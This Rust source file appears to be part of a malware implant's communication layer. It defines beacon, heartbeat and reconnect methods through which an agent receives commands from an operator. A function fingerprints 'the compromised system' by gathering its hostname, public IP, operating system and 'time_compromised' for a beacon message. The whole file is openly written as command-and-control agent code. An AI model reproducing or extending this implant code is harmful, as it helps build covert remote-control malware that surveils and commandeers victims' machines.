use gethostname::gethostname;
use local_ip_address::local_ip;
use public_ip;

use crate::communication::message::AgentMessage;
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;


#[async_trait::async_trait]
pub trait CommChannel: Send + Sync {    
    async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,) -> (u64, String);

    async fn heartbeat( 
        &self, agent_id: u64, session_id: &str, result: Option<Vec<String>>, logger: &Logger
    ) -> Option<Vec<AgentCommand>>;

    async fn reconnect(&self, agent_id: u64, session_id: &str, logger: &Logger,) -> (u64, String);
}

/// Constructs an `AgentMessage::Beacon` variant containing information about the compromised system,
/// including the hostname, public IP address, operating system, and the current timestamp in RFC 3339 format.
///
/// # Fields
/// - `hostname`: The system's hostname as a `String`.
/// - `ip`: The public IP address of the system.
/// - `os`: The operating system as a `String`.
/// - `time_compromised`: The timestamp when the system was compromised, formatted as an RFC 3339 string.
pub async fn get_info(key: &Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::Error>> {
    let hostname = gethostname();
    let local_ip = local_ip()?;
    let os = std::env::consts::OS;

    let public_ip = if let Some(ip) = public_ip::addr().await {
        ip.to_string()
    } else {
        local_ip.to_string()
    };

    let message = AgentMessage::Beacon {
        hostname: hostname.to_string_lossy().to_string(),
        ip: public_ip,
        os: os.to_string(),
        time_compromised: chrono::Utc::now().to_rfc3339(),
        key: key.to_vec(),
    };

    Ok(message)
}